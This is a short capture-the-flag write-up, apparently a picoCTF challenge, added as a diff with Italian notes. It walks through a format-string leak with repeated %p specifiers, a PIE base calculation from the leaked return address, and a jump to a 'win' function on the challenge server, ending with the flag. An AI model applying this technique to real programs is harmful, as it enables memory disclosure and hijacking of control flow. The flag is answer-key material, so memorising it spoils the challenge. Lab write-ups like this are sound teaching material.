@@ -1,0 +1,91 @@
+pwndbg> disas win
+Dump of assembler code for function win:
+   0x000000000000136a <+0>:	endbr64
+   0x000000000000136e <+4>:	push   rbp
+   0x000000000000136f <+5>:	mov    rbp,rsp
+   0x0000000000001372 <+8>:	sub    rsp,0x10
+   0x0000000000001376 <+12>:	lea    rdi,[rip+0xcf6]        # 0x2073
+   0x000000000000137d <+19>:	call   0x1110 <puts@plt>
+   0x0000000000001382 <+24>:	lea    rsi,[rip+0xcf3]        # 0x207c
+   0x0000000000001389 <+31>:	lea    rdi,[rip+0xcee]        # 0x207e
+   0x0000000000001390 <+38>:	call   0x1190 <fopen@plt>
+   0x0000000000001395 <+43>:	mov    QWORD PTR [rbp-0x8],rax
+   0x0000000000001399 <+47>:	cmp    QWORD PTR [rbp-0x8],0x0
+   0x000000000000139e <+52>:	jne    0x13b6 <win+76>
+   0x00000000000013a0 <+54>:	lea    rdi,[rip+0xce0]        # 0x2087
+   0x00000000000013a7 <+61>:	call   0x1110 <puts@plt>
+   0x00000000000013ac <+66>:	mov    edi,0x0
+   0x00000000000013b1 <+71>:	call   0x11b0 <exit@plt>
+   0x00000000000013b6 <+76>:	mov    rax,QWORD PTR [rbp-0x8]
+   0x00000000000013ba <+80>:	mov    rdi,rax
+   0x00000000000013bd <+83>:	call   0x1150 <fgetc@plt>
+   0x00000000000013c2 <+88>:	mov    BYTE PTR [rbp-0x9],al
+   0x00000000000013c5 <+91>:	jmp    0x13e1 <win+119>
+   0x00000000000013c7 <+93>:	movsx  eax,BYTE PTR [rbp-0x9]
+   0x00000000000013cb <+97>:	mov    edi,eax
+   0x00000000000013cd <+99>:	call   0x1100 <putchar@plt>
+   0x00000000000013d2 <+104>:	mov    rax,QWORD PTR [rbp-0x8]
+   0x00000000000013d6 <+108>:	mov    rdi,rax
+   0x00000000000013d9 <+111>:	call   0x1150 <fgetc@plt>
+   0x00000000000013de <+116>:	mov    BYTE PTR [rbp-0x9],al
+   0x00000000000013e1 <+119>:	cmp    BYTE PTR [rbp-0x9],0xff
+   0x00000000000013e5 <+123>:	jne    0x13c7 <win+93>
+   0x00000000000013e7 <+125>:	mov    edi,0xa
+   0x00000000000013ec <+130>:	call   0x1100 <putchar@plt>
+   0x00000000000013f1 <+135>:	mov    rax,QWORD PTR [rbp-0x8]
+   0x00000000000013f5 <+139>:	mov    rdi,rax
+   0x00000000000013f8 <+142>:	call   0x1120 <fclose@plt>
+   0x00000000000013fd <+147>:	nop
+   0x00000000000013fe <+148>:	leave
+   0x00000000000013ff <+149>:	ret
+End of assembler dump.
+
+pwndbg> disas main
+Dump of assembler code for function main:
+   0x0000000000001400 <+0>:	endbr64
+   0x0000000000001404 <+4>:	push   rbp
+   0x0000000000001405 <+5>:	mov    rbp,rsp
+   0x0000000000001408 <+8>:	lea    rsi,[rip+0xfffffffffffffe9a]        # 0x12a9 <segfault_handler>
+   0x000000000000140f <+15>:	mov    edi,0xb
+   0x0000000000001414 <+20>:	call   0x1170 <signal@plt>
+   0x0000000000001419 <+25>:	mov    rax,QWORD PTR [rip+0x2bf0]        # 0x4010 <stdout@@GLIBC_2.2.5>
+   0x0000000000001420 <+32>:	mov    ecx,0x0
+   0x0000000000001425 <+37>:	mov    edx,0x2
+   0x000000000000142a <+42>:	mov    esi,0x0
+   0x000000000000142f <+47>:	mov    rdi,rax
+   0x0000000000001432 <+50>:	call   0x1180 <setvbuf@plt>
+   0x0000000000001437 <+55>:	mov    eax,0x0
+   0x000000000000143c <+60>:	call   0x12c7 <call_functions>
+   0x0000000000001441 <+65>:	mov    eax,0x0
+   0x0000000000001446 <+70>:	pop    rbp
+   0x0000000000001447 <+71>:	ret
+End of assembler dump.
+
+
+--- il printf non essendo sicuro permette di leakare valori dello stack arbitrariamente. inserendo la stringa:
+%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
+
+si riceve in output:
+0x5555555592a1.0xfbad2288.(nil).(nil).0x5555555592a0.(nil).0x7ffff7fa9780.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x7fffffffe6c8.0x864c3c999efd8500.0x7fffffffe5b0.0x555555555441.0x1.0x7ffff7db7d90
+
+Tramite gdb so che 0x555555555441 è l'indirizzo di ritorno al main (ossia all'istruzione dall'indirizzo statico 0x0000000000001441).
+
+E' dunque possibile calcolare l'offset dell'esecuzione PIE:
+nc rescued-float.picoctf.net 58865                                                                                                                          ─╯
+Enter your name:%19$p
+0x5d0ef4d1d441
+
+Calcoliamo l'offset:
+>>> 0x5d0ef4d1d441-0x0000000000001441
+102318818312192
+
+Calcoliamo l'indirizzo della funzione win:
+>>> 0x000000000000136a+102318818312192
+102318818317162
+
+Convertiamo in hex: 102318818317162 > 00005D0EF4D1D36A.
+
+Inseriamo infine l'indirizzo:
+enter the address to jump to, ex => 0x12345: 0x00005D0EF4D1D36A
+You won!
+picoCTF{p13_5h0u1dn'7_134k_297076a0}
